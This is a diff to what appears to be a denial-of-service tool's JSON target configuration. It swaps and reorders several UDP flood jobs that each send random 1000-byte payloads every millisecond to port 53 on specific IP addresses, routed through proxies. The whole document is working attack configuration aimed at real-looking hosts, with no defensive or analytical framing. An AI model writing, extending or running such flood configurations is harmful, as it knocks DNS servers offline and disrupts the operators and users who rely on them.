@@ -4,7 +4,7 @@
     {
       "type": "udp",
       "args": {
-        "address": "185.42.137.111:53",
+        "address": "91.217.21.1:53",
         "interval_ms": 1,
         "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
@@ -13,7 +13,7 @@
     {
       "type": "udp",
       "args": {
-        "address": "91.217.20.1:53",
+        "address": "195.93.246.212:53",
         "interval_ms": 1,
         "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
@@ -40,16 +40,7 @@
     {
       "type": "udp",
       "args": {
-        "address": "91.217.21.1:53",
-        "interval_ms": 1,
-        "body": "{{- random_payload 1000 -}}",
-        "client": { "proxy_urls": "{{ get_proxylist }}" }
-      }
-    },
-    {
-      "type": "udp",
-      "args": {
-        "address": "195.93.246.212:53",
+        "address": "91.217.20.1:53",
         "interval_ms": 1,
         "body": "{{- random_payload 1000 -}}",
         "client": { "proxy_urls": "{{ get_proxylist }}" }
